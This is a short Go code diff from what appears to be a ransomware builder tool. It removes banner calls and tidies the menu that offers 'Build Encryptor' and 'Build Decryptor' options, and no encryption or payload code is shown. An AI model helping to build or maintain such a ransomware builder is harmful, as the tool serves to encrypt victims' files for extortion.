@@ -22,7 +22,6 @@ const (
 func LaunchRansomware() {
 	for {
 		utils.ClearTerminal()
-		utils.Banner()
 		showRansomwareMenu()
 
 		reader := bufio.NewReader(os.Stdin)
@@ -51,12 +50,11 @@ func showRansomwareMenu() {
 
 	fmt.Printf("%s  [1] Build Encryptor%s\n", utils.Green, utils.Reset)
 	fmt.Printf("%s  [2] Build Decryptor%s\n", utils.Blue, utils.Reset)
-	fmt.Printf("%s  [3] Return to Main Menu%s\n\n", utils.Yellow, utils.Reset)
+	utils.PrintReturnOption("3")
 }
 
 func buildEncryptor() {
 	utils.ClearTerminal()
-	utils.Banner()
 	fmt.Printf("\n%s═══ BUILD ENCRYPTOR ═══%s\n\n", utils.Red, utils.Reset)
 
 	reader := bufio.NewReader(os.Stdin)
@@ -158,7 +156,6 @@ func main() {
 
 func buildDecryptor() {
 	utils.ClearTerminal()
-	utils.Banner()
 	fmt.Printf("\n%s═══ BUILD DECRYPTOR ═══%s\n\n", utils.Blue, utils.Reset)
 
 	reader := bufio.NewReader(os.Stdin)
